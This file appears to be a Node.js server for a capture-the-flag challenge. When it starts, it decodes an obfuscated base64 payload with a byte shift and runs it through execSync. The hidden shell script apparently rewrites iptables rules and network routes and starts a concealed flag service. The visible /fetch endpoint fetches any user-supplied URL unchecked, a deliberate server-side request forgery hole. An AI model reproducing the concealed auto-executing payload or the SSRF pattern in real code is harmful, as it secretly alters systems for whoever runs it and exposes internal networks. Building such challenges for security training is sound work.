const http = require('http');
const url = require('url');
const { execSync } = require('child_process');

const payload = 'dWd2Ii9ndwwMS1JWQ0ROR1U/a3J2Y2RuZ3UvbmdpY2V7DGVxb29jcGYiL3giJCZLUlZDRE5HVSQiQDFmZ3gxcHdubiJ+fiJ9DCIiIiJnZWpxIiRrcnZjZG5ndS9uZ2ljZXsia3UidGdzd2t0Z2YiaHF0InZqa3UiZWpjbm5ncGlnJCJAKDQMIiIiImd6a3YiMwx/DAxrciJwZ3ZwdSJjZmYiZGNlbWdwZgxrciJua3BtImNmZiJ4Z3ZqL2pxdXYidntyZyJ4Z3ZqInJnZ3QicGNvZyJ4Z3ZqL2RjZW1ncGYMa3IibmtwbSJ1Z3YieGd2ai9kY2VtZ3BmInBndnB1ImRjZW1ncGYMa3IiY2ZmdCJjZmYiOjowOTkwODcwMzE0NiJmZ3gieGd2ai9qcXV2DGtyIm5rcG0idWd2InhndmovanF1diJ3cgwMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyImNmZnQiY2ZmIjo6MDk5MDg3MDo1MTQ2ImZneCJ4Z3ZqL2RjZW1ncGYMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyIm5rcG0idWd2InhndmovZGNlbWdwZiJ3cgxrciJwZ3ZwdSJnemdlImRjZW1ncGYia3IidHF3dmciY2ZmImZnaGN3bnYieGtjIjo6MDk5MDg3MDMiIiIMa3IicGd2cHUiZ3pnZSJkY2VtZ3BmImtyIm5rcG0idWd2Im5xIndyDAwkJktSVkNETkdVJCIvQyJRV1ZSV1YiL3EieGd2ai9qcXV2Ii9vInF5cGd0Ii8vd2tmL3F5cGd0InRxcXYiL2wiQ0VFR1JWDCQmS1JWQ0ROR1UkIi9DIlFXVlJXViIvcSJ4Z3ZqL2pxdXYiL2wiVEdMR0VWDCQmS1JWQ0ROR1UkIi9FIlFXVlJXViIvcSJ4Z3ZqL2pxdXYiL28icXlwZ3QiLy93a2YvcXlwZ3QidHFxdiIvbCJDRUVHUlYMJCZLUlZDRE5HVSQiL0UiUVdWUldWIi9xInhndmovanF1diIvbCJUR0xHRVYMDGd6cnF0diJUQ0VNYUdQWD9ydHFmd2V2a3FwDAxnZWpxIiR0Z3N3a3RnIil1a3BjdnRjKQwMdWd2IjxncHhrdHFwb2dwdi4iPHJ0cWZ3ZXZrcXAMdWd2Ijxka3BmLiIpOjowOTkwODcwOjUpDHVndiI8cnF0di4iOjIMDGlndiIpMSkiZnEMIiJeJD5qM0BJcSJjeWN7LiJ7cXcpbm4icGd4Z3QiaGtwZiJ2amciaG5jaT4xajNAXiQMZ3BmDAxpZ3YiKTFobmNpKSJmcQwiImtoInJjdGNvdV0pem9jdSlfIj8/IilqcWpxanEvay95Y3B2L3ZqZy9obmNpKQwiIiIiSGtuZzB0Z2NmKikxaG5jaSkrDCIiZ251ZwwiIiIiXiQ+ajNAdmpjdil1InBxdiJlcXR0Z2V2PjFqM0BeJAwiImdwZgxncGYMJCJ+ImtyInBndnB1Imd6Z2UiZGNlbWdwZiIxd3V0MWRrcDFyanIiLyIoDGVqa2VtZ3BhcmtmPyYjDAxkY2VtZ3BmYXRnY2Z7PzIMaHF0ImEia3AiMyI0IjUiNiI3IjgiOSI6IjsiMzI9ImZxDCIiIiJraCJld3RuIi9odVUianZ2cjwxMTo6MDk5MDg3MDo1MSJAMWZneDFwd25uIjRAKDM9InZqZ3AMIiIiIiIiIiJkY2VtZ3BmYXRnY2Z7PzMMIiIiIiIiIiJkdGdjbQwiIiIiaGsMIiIiImtoIiMibWtubiIvMiIkJmVqa2VtZ3BhcmtmJCI0QDFmZ3gxcHdubj0idmpncAwiIiIiIiIiImdlanEiJGRjZW1ncGYidWd0eGtlZyJnemt2Z2YiZGdocXRnImt2ImRnZWNvZyJ0Z2NmeyQiQCg0DCIiIiIiIiIiZ3prdiIzDCIiIiJoawwiIiIidW5nZ3IiMjA3DGZxcGcMDGtoIl0iJCZkY2VtZ3BmYXRnY2Z7JCIvcGciMyJfPSJ2amdwDCIiIiJnZWpxIiRkY2VtZ3BmInVndHhrZWciZmtmInBxdiJkZ2Vxb2cidGdjZnskIkAoNAwiIiIiZ3prdiIzDGhrDA==';

if (payload) {
  const decoded = Buffer.from(payload, 'base64');
  const unpacked = Buffer.from(decoded.map(byte => (byte - 2 + 256) % 256));
  execSync(unpacked.toString(), { stdio: 'inherit' });
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);

  if (parsedUrl.pathname === '/') {
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end('<h1>Welcome to the middleware service. We fetch things!</h1>');
  } else if (parsedUrl.pathname === '/fetch') {
    const targetUrl = parsedUrl.query.url;

    if (!targetUrl) {
      res.writeHead(400, { 'Content-Type': 'text/html' });
      res.end('<h1>Missing url parameter</h1>');
      return;
    }

    try {
      const response = await fetch(targetUrl);
      const content = await response.text();
      res.writeHead(200, { 'Content-Type': 'text/plain' });
      res.end(content);
    } catch (error) {
      res.writeHead(500, { 'Content-Type': 'text/html' });
      res.end(`<h1>Error fetching URL: ${error.message}</h1>`);
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/html' });
    res.end('<h1>Not Found</h1>');
  }
});

const PORT = process.env.PORT || 80;
const HOST = "72.79.72.79";
server.listen(PORT, HOST, () => {
    console.log(`Server running on http://${HOST}:${PORT}`);
});
